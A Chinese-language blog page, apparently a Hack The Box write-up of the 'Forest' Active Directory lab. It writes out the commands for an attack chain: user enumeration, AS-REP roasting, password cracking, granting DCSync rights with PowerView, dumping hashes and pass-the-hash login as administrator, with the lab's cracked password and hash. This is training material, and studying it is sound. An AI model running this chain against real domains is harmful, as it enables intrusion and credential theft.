@@ -1,0 +1,993 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="扫端口 nmap -sCV -A 10.10.10.161 第一次做域渗透的靶机，详细的看看 1 2 3 4 5 ● Kerberos （88/TCP）— Windows Kerberos 协议服务，可用于枚举AD 信息 ● LDAP （389/TCP）— 活动目">
+<title>Forest</title>
+
+<link rel='canonical' href='https://nergigantes.github.io/htb/forest/'>
+
+<link rel="stylesheet" href="/scss/style.min.f720cbcbc8f9265d2875caa41c2c2572405d50fc427ef4375391537c33376c29.css"><meta property='og:title' content="Forest">
+<meta property='og:description' content="扫端口 nmap -sCV -A 10.10.10.161 第一次做域渗透的靶机，详细的看看 1 2 3 4 5 ● Kerberos （88/TCP）— Windows Kerberos 协议服务，可用于枚举AD 信息 ● LDAP （389/TCP）— 活动目">
+<meta property='og:url' content='https://nergigantes.github.io/htb/forest/'>
+<meta property='og:site_name' content='NergiganteS&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Htb' /><meta property='article:published_time' content='2025-03-22T19:00:49&#43;08:00'/><meta property='article:modified_time' content='2025-03-22T19:06:53&#43;08:00'/><meta property='og:image' content='https://nergigantes.github.io/htb/forest/26.jpg' />
+<meta name="twitter:title" content="Forest">
+<meta name="twitter:description" content="扫端口 nmap -sCV -A 10.10.10.161 第一次做域渗透的靶机，详细的看看 1 2 3 4 5 ● Kerberos （88/TCP）— Windows Kerberos 协议服务，可用于枚举AD 信息 ● LDAP （389/TCP）— 活动目"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://nergigantes.github.io/htb/forest/26.jpg' />
+  
+
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu315a7ad84d8f1f09f998948c005c5c1b_42437_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">NergiganteS&#39;s Blog</a></h1>
+            <h2 class="site-description">分享学习笔记路程</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+                    
+                        <li id="i18n-switch">  
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-language" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M4 5h7" />
+  <path d="M9 3v2c0 4.418 -2.239 8 -5 8" />
+  <path d="M5 9c-.003 2.144 2.952 3.908 6.7 4" />
+  <path d="M12 20l4 -9l4 9" />
+  <path d="M19.1 18h-6.2" />
+</svg>
+
+
+
+                            <select name="language" title="language" onchange="window.location.href = this.selectedOptions[0].value">
+                                
+                                    <option value="https://nergigantes.github.io/en/" >English</option>
+                                
+                                    <option value="https://nergigantes.github.io/" selected>中文</option>
+                                
+                                    <option value="https://nergigantes.github.io/ar/" >عربي</option>
+                                
+                            </select>
+                        </li>
+                    
+                
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/htb/forest/">
+                <img src="/htb/forest/26_huee1a8fabd21df51848cd204d42dfde78_13233375_800x0_resize_q75_box.jpg"
+                        srcset="/htb/forest/26_huee1a8fabd21df51848cd204d42dfde78_13233375_800x0_resize_q75_box.jpg 800w, /htb/forest/26_huee1a8fabd21df51848cd204d42dfde78_13233375_1600x0_resize_q75_box.jpg 1600w"
+                        width="800" 
+                        height="450" 
+                        loading="lazy"
+                        alt="Featured image of post Forest" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/htb/" >
+                Htb
+            </a>
+        
+            <a href="/categories/%E5%9F%9F/" >
+                域
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/htb/sauna/">Sauna</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 22, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 1 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>扫端口</p>
+<p>nmap -sCV -A 10.10.10.161</p>
+<p><img src="/htb/forest/1742439388416-045b031c-7131-4cb7-93ff-25530f74c781.png"
+	width="1343"
+	height="310"
+	srcset="/htb/forest/1742439388416-045b031c-7131-4cb7-93ff-25530f74c781_hu53ac31f8a9b67c2fec3e17650187291d_458099_480x0_resize_box_3.png 480w, /htb/forest/1742439388416-045b031c-7131-4cb7-93ff-25530f74c781_hu53ac31f8a9b67c2fec3e17650187291d_458099_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="433"
+		data-flex-basis="1039px"
+	
+></p>
+<p><img src="/htb/forest/1742439496909-d3c5db9c-330e-4331-b3cc-9b6d97158eb9.png"
+	width="1080"
+	height="502"
+	srcset="/htb/forest/1742439496909-d3c5db9c-330e-4331-b3cc-9b6d97158eb9_hu486ed12525c597a8c17a7b2d40edd24f_583184_480x0_resize_box_3.png 480w, /htb/forest/1742439496909-d3c5db9c-330e-4331-b3cc-9b6d97158eb9_hu486ed12525c597a8c17a7b2d40edd24f_583184_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="215"
+		data-flex-basis="516px"
+	
+></p>
+<p>第一次做域渗透的靶机，详细的看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">● Kerberos （88/TCP）— Windows Kerberos 协议服务，可用于枚举AD 信息
+</span></span><span class="line"><span class="cl">● LDAP （389/TCP）— 活动目录 LDAP。LDAP 通常提供有关 AD 的详细信息。而如果允许匿名绑定，我们可以查询到很多好的AD信息，比如用户信息。
+</span></span><span class="line"><span class="cl">● SMB （445/TCP）— Windows 服务器消息块 （“SMB”） 协议。对于 SMB，最好检查它是否允许空会话。如果允许我们可以枚举许多有用的 AD 信息。
+</span></span><span class="line"><span class="cl">● WinRM （5985/TCP）— WS-Management 协议的 Microsoft 实现。这可以允许通过 PowerShell 进行远程连接。
+</span></span><span class="line"><span class="cl">● RPC（135/RPC） 可用于枚举AD 信息
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/forest/1742440439892-6dd43ba0-4bfc-41f9-8c83-785739b0b167.png"
+	width="496"
+	height="97"
+	srcset="/htb/forest/1742440439892-6dd43ba0-4bfc-41f9-8c83-785739b0b167_hu9b0154a4e09755097bb37a9b4f86273c_48133_480x0_resize_box_3.png 480w, /htb/forest/1742440439892-6dd43ba0-4bfc-41f9-8c83-785739b0b167_hu9b0154a4e09755097bb37a9b4f86273c_48133_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="511"
+		data-flex-basis="1227px"
+	
+></p>
+<p>smb2-security-mode：这是 Nmap 用来检查 SMBv2 安全设置的结果。<br>
+Message signing enabled and required：这表示消息签名已启用并且是强制性的。在 SMB 协议中，启用消息签名有助于防止中间人攻击，保证数据的完整性和真实性。强制要求消息签名表示任何连接到该服务的客户端都必须使用消息签名。</p>
+<p><img src="/htb/forest/1742440471794-dde66b90-213e-4fc8-9a3e-3b1d2f9f7cc1.png"
+	width="361"
+	height="119"
+	srcset="/htb/forest/1742440471794-dde66b90-213e-4fc8-9a3e-3b1d2f9f7cc1_huf078dcdcdbee5b77469a38315b08777c_49993_480x0_resize_box_3.png 480w, /htb/forest/1742440471794-dde66b90-213e-4fc8-9a3e-3b1d2f9f7cc1_huf078dcdcdbee5b77469a38315b08777c_49993_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="303"
+		data-flex-basis="728px"
+	
+></p>
+<ul>
+<li><strong>account_used: <blank></strong>：没有提供账户信息，通常这表示你没有成功登录任何账户，可能是匿名访问或者没有认证。</li>
+<li><strong>authentication_level: user</strong>：这表示 SMB 服务要求使用用户级别的认证。也就是说，在连接时需要提供用户名和密码来验证用户身份。</li>
+<li><strong>challenge_response: supported</strong>：支持挑战-响应认证，这通常是指 NTLM（NT LAN Manager）认证机制，用于验证用户身份。</li>
+<li><strong>message_signing: required</strong>：消息签名是必需的，确保 SMB 通信的安全性和完整性。</li>
+<li><img src="/htb/forest/1742440496069-8816cd99-639c-4188-84ea-b1a80bf17a43.png"
+	width="840"
+	height="180"
+	srcset="/htb/forest/1742440496069-8816cd99-639c-4188-84ea-b1a80bf17a43_hu56c403dc003a4f0fb65edb7ca0dff2ef_166351_480x0_resize_box_3.png 480w, /htb/forest/1742440496069-8816cd99-639c-4188-84ea-b1a80bf17a43_hu56c403dc003a4f0fb65edb7ca0dff2ef_166351_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="466"
+		data-flex-basis="1120px"
+	
+></li>
+<li><strong>OS: Windows Server 2016 Standard 14393</strong>：这是目标系统的操作系统版本。它运行的是 Windows Server 2016 Standard，版本号为 14393。</li>
+<li><strong>Computer name: FOREST</strong>：计算机的主机名是 <code>FOREST</code>。</li>
+<li><strong>NetBIOS computer name: FOREST\x00</strong>：NetBIOS 名称也是 <code>FOREST</code>，<code>\x00</code> 是 NetBIOS 名称的结束符。</li>
+<li><strong>Domain name: htb.local</strong>：该机器加入了名为 <code>htb.local</code> 的域。</li>
+<li><strong>Forest name: htb.local</strong>：这是 Active Directory 林（Forest）的名称，与域名相同。</li>
+<li><strong>FQDN: FOREST.htb.local</strong>：这是完整的域名（FQDN），即 <code>FOREST.htb.local</code></li>
+<li><img src="/htb/forest/1742440530634-972b04fa-305f-4ffc-bd53-a0b55990dc2a.png"
+	width="748"
+	height="118"
+	srcset="/htb/forest/1742440530634-972b04fa-305f-4ffc-bd53-a0b55990dc2a_huf02d0c7de5ea144626adf5eb6aaec319_87557_480x0_resize_box_3.png 480w, /htb/forest/1742440530634-972b04fa-305f-4ffc-bd53-a0b55990dc2a_huf02d0c7de5ea144626adf5eb6aaec319_87557_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="633"
+		data-flex-basis="1521px"
+	
+></li>
+<li><strong>date</strong>：表示系统当前时间是 <code>2025-03-20T02:27:24</code>（UTC）。</li>
+<li><strong>start_date</strong>：表示 SMB 服务启动的时间为 <code>2025-03-20T02:22:58</code>（UTC）。</li>
+<li><strong>clock-skew</strong>：系统时间偏差。这里显示的偏差值如下：</li>
+<li><strong>mean (平均偏差): 2小时08分钟29秒</strong></li>
+<li><strong>deviation (偏差范围): 4小时02分钟30秒</strong></li>
+<li><strong>median (中位数): -11分钟31秒</strong></li>
+</ul>
+<p>枚举一下用户名，用kerbrute爆一下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> ./kerbrute_linux_amd64 userenum --dc 10.10.10.161 -d htb.local /home/kali/Desktop/Blasting-Dictionary-master/xato-net-10-million-usernames.txt 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>取决于字典</p>
+<p><img src="/htb/forest/1742462653206-997bd00b-7eba-4fad-b832-52deae1c82cf.png"
+	width="1538"
+	height="675"
+	srcset="/htb/forest/1742462653206-997bd00b-7eba-4fad-b832-52deae1c82cf_huc5fe64e50fe05f1d6571e567c4db77ff_865238_480x0_resize_box_3.png 480w, /htb/forest/1742462653206-997bd00b-7eba-4fad-b832-52deae1c82cf_huc5fe64e50fe05f1d6571e567c4db77ff_865238_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="227"
+		data-flex-basis="546px"
+	
+></p>
+<p>还有就是rpcclient</p>
+<p><font style="color:rgb(77, 77, 77);">rpcclient是Samba套件中的一个工具，允许攻击者或渗透测试人员与Windows系统上的SMB服务进行交互，执行各种RPC调用。它可用于枚举域信息、用户、组、共享资源等</font></p>
+<p><font style="color:rgb(77, 77, 77);"></font></p>
+<p>前面的信息收集看到了开放了的135RPC端口</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#RPC测试</span>
+</span></span><span class="line"><span class="cl">rpcclient -U <span class="s2">&#34;&#34;</span> 10.10.10.161 建立连接 
+</span></span><span class="line"><span class="cl">enumdomusers 枚举用户 
+</span></span><span class="line"><span class="cl">srvinfo 服务器信息枚举
+</span></span><span class="line"><span class="cl">enumdomains 枚举网络中的所有域
+</span></span><span class="line"><span class="cl">ips：空身份验证有助于在使用时枚举域和用户，这是 Windows Server <span class="m">2003</span> 和 <span class="m">2008</span> 中的一项功能。在以后的版本中，它在进行全新安装时被删除。从以前版本的 Windows Server 升级时，该功能不会被禁用，因为用户可能正在使用此功能。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/htb/forest/1742463106528-c9f7c171-3bb5-4db3-8eb7-6b82c468e6ad.png"
+	width="1734"
+	height="515"
+	srcset="/htb/forest/1742463106528-c9f7c171-3bb5-4db3-8eb7-6b82c468e6ad_hu137e734bf8f6cd025130abca7b12ec15_742000_480x0_resize_box_3.png 480w, /htb/forest/1742463106528-c9f7c171-3bb5-4db3-8eb7-6b82c468e6ad_hu137e734bf8f6cd025130abca7b12ec15_742000_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="336"
+		data-flex-basis="808px"
+	
+></p>
+<p>所有当前就列举出来了以下用户</p>
+<p>mark</p>
+<p>andy</p>
+<p>forest</p>
+<p>administrator</p>
+<p>sebastien</p>
+<p>santi</p>
+<p>lucinda</p>
+<p>svc-alfresco</p>
+<p>然后使用impacket-GetNPUsers爆破一下这些用户的hash值</p>
+<p><img src="/htb/forest/1742463687238-eae50afc-309b-476b-a0dd-797b9a5176c1.png"
+	width="1775"
+	height="389"
+	srcset="/htb/forest/1742463687238-eae50afc-309b-476b-a0dd-797b9a5176c1_hud435bc24fa7c6319187f59b5d8833f97_561899_480x0_resize_box_3.png 480w, /htb/forest/1742463687238-eae50afc-309b-476b-a0dd-797b9a5176c1_hud435bc24fa7c6319187f59b5d8833f97_561899_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="456"
+		data-flex-basis="1095px"
+	
+></p>
+<p>成功的拿到了svc-alfresco用户的hash</p>
+<p>爆破一下</p>
+<p><img src="/htb/forest/1742464047219-326b892a-c246-4d62-80a9-eff81b401b0d.png"
+	width="1183"
+	height="151"
+	srcset="/htb/forest/1742464047219-326b892a-c246-4d62-80a9-eff81b401b0d_hu5365e2f4ad187999e448f25073349b8f_226444_480x0_resize_box_3.png 480w, /htb/forest/1742464047219-326b892a-c246-4d62-80a9-eff81b401b0d_hu5365e2f4ad187999e448f25073349b8f_226444_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="783"
+		data-flex-basis="1880px"
+	
+></p>
+<p>成功的拿到了密码</p>
+<p>s3rvice</p>
+<p>然后使用 evil-winRM  登陆一下</p>
+<p>登陆成功了上传bloodhound.exe看一下域的情况</p>
+<p>拿回zip文件放回本地分析一下</p>
+<p>为当前的SVC-ALFRESCO用户加骷髅头之后查看最短线</p>
+<p><img src="/htb/forest/1742477387570-6bb4d79a-7b3f-497f-b7f2-614e672578f4.png"
+	width="1410"
+	height="1011"
+	srcset="/htb/forest/1742477387570-6bb4d79a-7b3f-497f-b7f2-614e672578f4_hu21534f86af85cb1ef14727f491b65df1_109336_480x0_resize_box_3.png 480w, /htb/forest/1742477387570-6bb4d79a-7b3f-497f-b7f2-614e672578f4_hu21534f86af85cb1ef14727f491b65df1_109336_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="139"
+		data-flex-basis="334px"
+	
+></p>
+<p>我们当前用户组一环套一环，最终能看到我们是ACCOUNT OPERATORS组的一员并且能够拥有EXCH01.HTB.LOCAL的完全权限</p>
+<p>现在看着有点迷，但是我们再看看EXCH01.HTB.LOCAL的线就清楚了</p>
+<p><img src="/htb/forest/1742478312474-9f95c67c-e3d1-4cfa-8aeb-291d615bcf48.png"
+	width="2057"
+	height="521"
+	srcset="/htb/forest/1742478312474-9f95c67c-e3d1-4cfa-8aeb-291d615bcf48_hu8720da16aafe05265b3e375a77212b69_79680_480x0_resize_box_3.png 480w, /htb/forest/1742478312474-9f95c67c-e3d1-4cfa-8aeb-291d615bcf48_hu8720da16aafe05265b3e375a77212b69_79680_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="394"
+		data-flex-basis="947px"
+	
+></p>
+<p>所有现在思路是创建一个新的用户，给他加到EXCHANGE WINDOWS PERMISSIONS组，使得他在HTB.LOCAL有WriteDacl的权限，然后给这个用户DcSync 权限，接着执行 DcSync 攻击并转储域上所有用户的密码哈希值，之后通过管理员的hash登陆，接管域</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">1. net user zss password /add /domain
+</span></span><span class="line"><span class="cl">2. net group <span class="s2">&#34;EXCHANGE WINDOWS PERMISSIONS&#34;</span> /add zss
+</span></span><span class="line"><span class="cl">3. 上传Powerview.ps1文件给到zss用户DcSync 权限  
+</span></span><span class="line"><span class="cl">Import-Module .<span class="se">\P</span>owerView.ps1
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>**$pass = convertto-securestring &lsquo;password&rsquo; -AsPlainText -Force</p>
+<p>****$cred = New-Object System.Management.Automation.PSCredential(&lsquo;htb\zeus&rsquo;, $pass)</p>
+<p>**<strong>Add-DomainObjectAcl -Credential $cred -TargetIdentity &ldquo;DC=htb,DC=local&rdquo; -PrincipalIdentity zss -Rights DCSync</strong></p>
+<p>然后用<a class="link" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py"  target="_blank" rel="noopener"
+    >secretsdump</a>脚本拿到hash</p>
+<p><img src="/htb/forest/1742478859276-836cbaf0-aa84-42c5-8034-af782075412a.png"
+	width="1198"
+	height="206"
+	srcset="/htb/forest/1742478859276-836cbaf0-aa84-42c5-8034-af782075412a_hub69d77676a4f8a0fbc8eb5d7cae3442d_110144_480x0_resize_box_3.png 480w, /htb/forest/1742478859276-836cbaf0-aa84-42c5-8034-af782075412a_hub69d77676a4f8a0fbc8eb5d7cae3442d_110144_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="581"
+		data-flex-basis="1395px"
+	
+></p>
+<p>再用psexec脚本使用hash值登陆</p>
+<p>impacket-psexec <a class="link" href="mailto:htb.local/administrator@10.10.10.161" >htb.local/administrator@10.10.10.161</a> -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</p>
+<p><img src="/htb/forest/1742478922413-34859606-2fdd-4cee-99e0-a931861c5c17.png"
+	width="368"
+	height="110"
+	srcset="/htb/forest/1742478922413-34859606-2fdd-4cee-99e0-a931861c5c17_hu1f00727e335cd2951c1cf5a8989802e1_8103_480x0_resize_box_3.png 480w, /htb/forest/1742478922413-34859606-2fdd-4cee-99e0-a931861c5c17_hu1f00727e335cd2951c1cf5a8989802e1_8103_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="334"
+		data-flex-basis="802px"
+	
+></p>
+<p>成功了！！！</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    <section class="article-lastmod">
